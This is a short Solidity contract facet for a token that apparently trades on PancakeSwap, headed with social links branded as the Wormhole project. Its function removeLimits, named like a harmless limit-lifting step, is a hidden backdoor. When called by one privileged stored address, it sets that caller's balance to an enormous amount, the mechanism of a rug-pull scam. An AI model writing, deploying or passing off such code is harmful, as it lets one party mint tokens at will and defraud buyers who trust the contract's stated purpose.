/*  
   * SPDX-License-Identifier: MIT

     // Telegram: https://t.me/wormholecrypto
    // Twitter: https://twitter.com/wormholecrypto
    // Website: https://wormhole.com/
    // Medium:  https://wormholecrypto.medium.com/
    // Discord: https://discord.com/invite/xsT8qrHAvV
    // Github:  https://github.com/wormholecrypto
*/

pragma solidity ^0.8.23;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
